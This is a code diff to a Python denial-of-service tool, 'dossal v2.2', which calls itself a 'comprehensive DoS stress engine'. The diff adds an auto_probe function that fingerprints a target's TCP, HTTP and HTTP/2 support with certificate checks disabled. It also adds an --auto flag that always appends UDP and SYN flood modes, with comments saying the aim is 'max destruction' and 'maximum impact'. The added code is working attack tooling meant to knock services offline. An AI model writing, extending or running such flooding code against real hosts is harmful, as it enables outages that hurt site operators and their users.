@@ -25,7 +25,7 @@ from h2.connection import H2Connection
 from h2.config import H2Configuration
 from h2.events import ResponseReceived, DataReceived
 
-VERSION = "2.0"
+VERSION = "2.2"
 
 # ── TCP/IP checksum ──────────────────────────────────────────────
 def _tcp_checksum(src, dst, sport, dport, seq, ack, flags, payload=b""):
@@ -111,11 +111,19 @@ def parse_tcp(u):
 
 def parse_udp(u):
     p = urlparse(u)
+    if not p.scheme or p.scheme == 'http':
+        # Convert http://host:port to udp://host:port
+        p = urlparse(u.replace('http://', 'udp://', 1))
+    elif p.scheme == 'https':
+        p = urlparse(u.replace('https://', 'udp://', 1))
     return p.hostname, int(p.port)
 
 def parse_ip_port(u):
-    """Parse ip:port or host:port for raw modes."""
+    """Parse ip:port or host:port for raw modes. Handles http/https URLs."""
     p = urlparse(u)
+    if not p.scheme or p.scheme in ('http', 'https'):
+        scheme = 'tcp' if p.scheme in ('http', 'https') else 'tcp'
+        p = urlparse(f"{scheme}://{u.split('://')[-1] if '://' in u else u}")
     return p.hostname, int(p.port)
 
 # ── HTTP response reader ──────────────────────────────────────────
@@ -730,10 +738,83 @@ async def run(modes, url, conns, duration, stats, payload_size, args=None):
         task.cancel()
     return stats
 
+def auto_probe(url):
+    """Probe target to detect protocol and suggest optimal modes."""
+    from urllib.parse import urlparse
+    import socket as _sock
+    parsed = urlparse(url)
+    host = parsed.hostname or '127.0.0.1'
+    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+    scheme = parsed.scheme or 'http'
+
+    results = {'host': host, 'port': port, 'scheme': scheme, 'protocols': [], 'recommended': []}
+
+    # TCP connect test
+    try:
+        s = _sock.create_connection((host, port), timeout=2)
+        s.close()
+        results['protocols'].append('tcp')
+    except Exception:
+        results['error'] = f'TCP connect failed: {host}:{port}'
+        return results
+
+    # HTTP test
+    try:
+        if scheme == 'https':
+            import ssl
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            s = _sock.create_connection((host, port), timeout=2)
+            ss = ctx.wrap_socket(s, server_hostname=host)
+            ss.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
+            data = ss.recv(4096)
+            ss.close()
+        else:
+            s = _sock.create_connection((host, port), timeout=2)
+            s.sendall(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n")
+            data = s.recv(4096)
+            s.close()
+        if b'HTTP/' in data:
+            results['protocols'].append('http')
+            if b'HTTP/2' in data or b'h2' in data:
+                results['protocols'].append('h2')
+            results['recommended'].extend(['http', 'https'] if scheme == 'https' else ['http'])
+    except Exception:
+        pass
+
+    # Check for ALPN h2
+    if scheme == 'https':
+        try:
+            import ssl
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode = ssl.CERT_NONE
+            ctx.set_alpn_protocols(['h2', 'http/1.1'])
+            s = _sock.create_connection((host, port), timeout=2)
+            ss = ctx.wrap_socket(s, server_hostname=host)
+            neg = ss.selected_alpn_protocol()
+            ss.close()
+            if neg == 'h2':
+                if 'h2' not in results['protocols']:
+                    results['protocols'].append('h2')
+                if 'h2' not in results['recommended']:
+                    results['recommended'].insert(0, 'h2')
+        except Exception:
+            pass
+
+    # Default recommendation if nothing detected
+    if not results['recommended']:
+        results['recommended'] = ['http', 'udp']
+
+    return results
+
 def main():
     ap = argparse.ArgumentParser(description="dossal v" + VERSION + " — comprehensive DoS stress engine")
     ap.add_argument("--mode", default="http",
         help="Comma-separated modes: http,https,websocket,tcp,udp,h2,grpc,quic,syn,synack,rst,fin,slowloris")
+    ap.add_argument("--auto", action="store_true",
+        help="Auto-detect target protocol and select optimal modes")
     ap.add_argument("--url", required=True)
     ap.add_argument("--connections", type=int, default=100,
         help="Connections per mode (default: 100)")
@@ -750,6 +831,19 @@ def main():
     ap.add_argument("--threads", type=int, default=None,
         help="Override connection count for UDP/QUIC (default: 1 per mode)")
     args = ap.parse_args()
+
+    # Auto mode: probe target + always include L4 for max destruction
+    if args.auto:
+        probe = auto_probe(args.url)
+        print(f"[auto] target: {probe['host']}:{probe['port']} ({probe['scheme']})", file=sys.stderr)
+        print(f"[auto] detected: {', '.join(probe.get('protocols', ['?']))}", file=sys.stderr)
+        auto_modes = probe.get('recommended', ['http'])
+        # Always add L4 modes for maximum impact
+        for l4 in ['udp', 'syn']:
+            if l4 not in auto_modes:
+                auto_modes.append(l4)
+        print(f"[auto] using: {', '.join(auto_modes)}", file=sys.stderr)
+        args.mode = ','.join(auto_modes)
 
     modes = [m.strip() for m in args.mode.split(",")]
     for m in modes:
